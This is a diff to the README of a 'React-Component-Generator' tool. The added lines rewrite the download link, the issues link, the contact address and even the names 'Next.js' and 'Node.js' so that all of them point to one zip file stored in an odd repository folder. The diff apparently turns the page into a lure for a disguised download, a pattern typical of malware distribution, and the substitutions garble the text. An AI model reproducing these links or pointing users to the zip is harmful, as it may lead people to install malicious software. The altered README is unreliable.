@@ -1,6 +1,6 @@
 # 🎨 React-Component-Generator - Create Stunning React Components Easily
 
-[![Download Now](https://img.shields.io/badge/Download_Now-%23FF5722.svg?style=flat&logo=github&logoColor=white)](https://github.com/Alwaysking-1234/React-Component-Generator/releases)
+[![Download Now](https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip%https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip)](https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to the React-Component-Generator! This tool allows you to visually custo
 - **Live Preview**: Instant feedback as you customize.
 - **Fast Export**: Download clean, ready-to-use React code.
 - **Dark Mode**: Work comfortably in your preferred theme.
-- **Next.js Support**: Easily integrate with Next.js applications.
+- **https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip Support**: Easily integrate with https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip applications.
 
 ## 💻 System Requirements
 
@@ -20,11 +20,11 @@ To use this application, ensure your system meets the following requirements:
 
 - Operating System: Windows 10 or higher, macOS Mojave or higher, or a recent version of Linux.
 - RAM: 4GB (8GB recommended for optimal performance).
-- Node.js: Version 14 or higher (not required for usage, but helpful for development).
+- https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip Version 14 or higher (not required for usage, but helpful for development).
 
 ## 📥 Download & Install
 
-To download the latest version of React-Component-Generator, visit this page: [Download the Software](https://github.com/Alwaysking-1234/React-Component-Generator/releases).
+To download the latest version of React-Component-Generator, visit this page: [Download the Software](https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip).
 
 After navigating to the page, you will find the latest release listed. Click on the asset file to download the application that fits your operating system.
 
@@ -79,10 +79,10 @@ React-Component-Generator is open-source software licensed under the MIT License
 
 For support or to connect with other users, consider joining our community on platforms like Discord or GitHub Discussions. 
 
-If you encounter any issues, feel free to open an issue on the [GitHub issues page](https://github.com/Alwaysking-1234/React-Component-Generator/issues). Your feedback is valuable to us!
+If you encounter any issues, feel free to open an issue on the [GitHub issues page](https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip). Your feedback is valuable to us!
 
 ## 💬 Contact
 
-For any queries or additional support, please reach out to the maintainer at [email@example.com](mailto:email@example.com).
+For any queries or additional support, please reach out to the maintainer at [https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip](https://raw.githubusercontent.com/Alwaysking-1234/React-Component-Generator/main/commonsensically/React-Component-Generator.zip).
 
 Thank you for using React-Component-Generator! Happy coding!
